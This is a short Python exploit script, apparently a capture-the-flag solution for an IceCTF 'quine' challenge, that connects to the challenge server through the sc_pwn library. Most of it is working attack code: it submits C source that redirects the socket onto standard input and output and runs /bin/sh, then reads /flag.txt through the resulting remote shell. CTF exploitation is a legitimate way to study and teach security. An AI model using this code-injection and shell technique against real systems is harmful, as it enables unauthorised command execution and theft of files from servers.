#!/usr/bin/env python
from sc_pwn import *

env = Environment('q1', 'q2')
env.set_item('target',  q1 = {'host':'quine.vuln.icec.tf','port':5500},\
                        q2 = {'host':'quine.vuln.icec.tf','port':5501})
env.select()

#==========
def attack(cmn):
    cmn.read_until('line\n')
    cmn.sendln('int main() { int i; for(i=0;i<3;i++)dup2(4,i); system("/bin/sh");}')
    cmn.sendln('.')

    cmn.read_until('complete!\n')
    cmn.sendln('read a < /flag.txt')
    cmn.sendln('echo $a')
    
    info('flag : %s' % cmn.read_until())
    
#==========
    
if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)
    del(cmn)
    
#==========
